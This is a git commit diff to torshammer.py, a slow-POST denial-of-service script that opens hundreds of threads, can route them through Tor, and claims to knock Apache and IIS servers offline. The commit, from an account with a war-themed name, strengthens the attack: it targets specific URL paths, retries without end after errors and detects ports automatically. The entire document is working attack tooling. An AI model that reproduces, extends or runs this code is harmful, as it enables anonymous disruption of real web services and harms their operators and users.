a6e65bec5b041047c1d03d78a1a558f033547fdf
Fuck Russian Warship <100783468+fckwarship@users.noreply.github.com>
2022-03-03 23:25:19 +0100

    Target specific paths, retry in face of errors indefinitely, autodetect port number

--- torshammer.py
+++ torshammer.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 # this assumes you have the socks.py (http://phiral.net/socks.py) in the
-# same directory and that you have tor running locally 
+# same directory and that you have tor running locally
 # on port 9150. run with 128 to 256 threads to be effective.
 # kills apache 1.X with ~128, apache 2.X / IIS with ~256
 # not effective on nginx
@@ -14,6 +14,7 @@ import socks
 import string
 import ssl
 
+from urllib.parse import urlparse
 from threading import Thread
 
 global stop_now
@@ -27,39 +28,53 @@ def get_useragent_list():
 useragents = get_useragent_list()
 
 class HttpPostThread(Thread):
-    def __init__(self, thread_id, host, port, tor):
+    def __init__(self, thread_id, target, tor):
         Thread.__init__(self)
         self.thread_id = thread_id
-        self.host = host
-        self.port = port
-        self.socket = socks.socksocket()
-        self.transport = None
         self.tor = tor
+        self.transport = None
         self.running = True
+        url = urlparse(target)
+        self.host = url.hostname
+        self.path = url.path or '/'
+        self.port = url.port if url.port else 443 if url.scheme == 'https' else 80
+        self._init_socket()
+
+    def _init_socket(self):
+        self.socket = socks.socksocket()
+        if self.tor:
+            self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
+
+    def _log(self, msg):
+        print(f'[Thread #{self.thread_id}] {msg}')
 
     def _send_http_post(self, payload_length=10000):
         global stop_now
 
-        headers = ('POST / HTTP/1.1\r\n'
-                   'Host: %s\r\n'
-                   'User-Agent: %s\r\n'
-                   'Connection: keep-alive\r\n'
-                   'Keep-Alive: 900\r\n'
-                   'Content-Length: %d\r\n'
-                   'Content-Type: application/x-www-form-urlencoded\r\n\r\n' % (self.host, random.choice(useragents), payload_length))
+        headers_list = [
+            f'POST {self.path} HTTP/1.1',
+            f'Host: {self.host}',
+            f'User-Agent: {random.choice(useragents)}',
+            'Connection: keep-alive',
+            'Keep-Alive: timeout=900, max=1000',
+            'Content-Length: {payload_length}',
+            'Content-Type: application/x-www-form-urlencoded',
+        ]
+        headers = '\r\n'.join(headers_list)
         self.transport.send(headers.encode())
-        print(f'[Thread #{self.thread_id}] Sent headers:\n{headers.strip()}\n')
+        self.transport.send(b'\r\n\r\n')
+        self._log(f'Sent headers:\n{headers}\n')
 
         for i in range(0, payload_length - 1):
             if stop_now:
                 self.running = False
                 break
             p = random.choice(string.ascii_letters + string.digits)
-            print(f'[Thread #{self.thread_id}] Posting byte {i + 1} out of {payload_length}: ' + p)
+            self._log(f'Posting byte {i + 1} out of {payload_length}: {p}')
             self.transport.send(p.encode())
             time.sleep(random.uniform(0.1, 3))
 
-        # self.transport.close()
+        self.transport.close()
 
     def _connect(self):
         self.socket.connect((self.host, self.port))
@@ -69,42 +84,34 @@ class HttpPostThread(Thread):
         while self.running:
             while self.running:
                 try:
-                    if self.tor:
-                        self.socket.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
-                        time.sleep(1)
+                    self._log(f'Connecting to {self.host}:{self.port}...')
                     self._connect()
-                    print(f'Connected to {self.host}:{self.port}')
                     break
                 except Exception as e:
-                    print(f'Error connecting to {self.host}:{self.port}')
-                    print(e)
+                    self._log(f'Error connecting to {self.host}:{self.port}: {e.errno} {e.strerror}')
+                    self._init_socket()
                     time.sleep(1)
-                    sys.exit()
 
             while self.running:
                 try:
                     self._send_http_post()
                 except Exception as e:
-                    if e.args[0] == 32 or e.args[0] == 104:
-                        print('Thread broken, restarting...')
-                        self.socket = socks.socksocket()
-                        break
-                    print(f'Error: {e}')
+                    self._log(f'Connection closed, error {e.errno} {e.strerror}. Restarting...')
+                    self._init_socket()
                     time.sleep(1)
-                    pass
+                    break
 
 def usage():
-    print('./torshammer.py -t <target> [-r <threads> -p <port> -T -h]')
-    print(' -t|--target <Hostname|IP>')
+    print('./torshammer.py -t <target> [-r <threads> -T -h]')
+    print(' -t|--target <URL including protocol, host and path>')
     print(' -r|--threads <Number of threads> Defaults to 256')
-    print(' -p|--port <Web Server Port> Defaults to 80')
     print(' -T|--tor Enable anonymising through tor on 127.0.0.1:9150')
     print(' -h|--help Shows this help\n')
     print('Eg. ./torshammer.py -t 192.168.1.100 -r 256\n')
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(argv, 'hTt:r:p:', ['help', 'tor', 'target=', 'threads=', 'port='])
+        opts, args = getopt.getopt(argv, 'hTt:r:', ['help', 'tor', 'target=', 'threads='])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -114,7 +121,6 @@ def main(argv):
     target = ''
     threads = 256
     tor = False
-    port = 80
 
     for o, a in opts:
         if o in ('-h', '--help'):
@@ -126,20 +132,18 @@ def main(argv):
             target = a
         elif o in ('-r', '--threads'):
             threads = int(a)
-        elif o in ('-p', '--port'):
-            port = int(a)
 
-    if target == '' or int(threads) <= 0:
+    if target == '' or threads <= 0:
         usage()
         sys.exit(-1)
 
-    print('\n* Target: %s Port: %d' % (target, port))
+    print('\n* Target: %s' % (target))
     print('* Threads: %d Tor: %s' % (threads, tor))
     print('* Give 20 seconds without tor or 40 with before checking site\n')
 
     rthreads = []
     for i in range(threads):
-        t = HttpPostThread(i, target, port, tor)
+        t = HttpPostThread(i, target, tor)
         rthreads.append(t)
         t.start()
 
